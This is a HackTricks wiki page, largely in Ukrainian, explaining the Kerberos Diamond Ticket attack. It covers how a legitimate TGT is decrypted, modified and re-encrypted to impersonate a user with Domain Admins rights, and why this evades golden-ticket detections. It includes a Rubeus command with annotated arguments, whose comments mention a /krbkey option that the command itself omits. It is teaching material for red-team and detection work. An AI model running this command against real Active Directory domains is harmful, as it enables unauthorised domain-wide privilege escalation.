# Diamond Ticket

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Diamond Ticket

**Як золотий квиток**, діамантовий квиток - це TGT, який можна використовувати для **доступу до будь-якої служби як будь-який користувач**. Золотий квиток підробляється повністю офлайн, зашифрований хешем krbtgt цього домену, а потім передається в сеанс входу для використання. Оскільки контролери домену не відстежують TGT, які (або які) вони легітимно видали, вони з радістю приймуть TGT, зашифровані їх власним хешем krbtgt.

Існує дві поширені техніки для виявлення використання золотих квитків:

* Шукати TGS-REQ, які не мають відповідного AS-REQ.
* Шукати TGT, які мають смішні значення, такі як стандартний 10-річний термін дії Mimikatz.

**Діамантовий квиток** створюється шляхом **модифікації полів легітимного TGT, який був виданий DC**. Це досягається шляхом **запиту** **TGT**, **дешифрування** його за допомогою хешу krbtgt домену, **модифікації** бажаних полів квитка, а потім **зашифрування** його знову. Це **переборює дві вищезгадані недоліки** золотого квитка, оскільки:

* TGS-REQ матиме попередній AS-REQ.
* TGT був виданий DC, що означає, що він матиме всі правильні деталі з політики Kerberos домену. Навіть якщо ці деталі можна точно підробити в золотому квитку, це складніше і відкрито для помилок.
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
{% hint style="success" %}
Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.

</details>
{% endhint %}
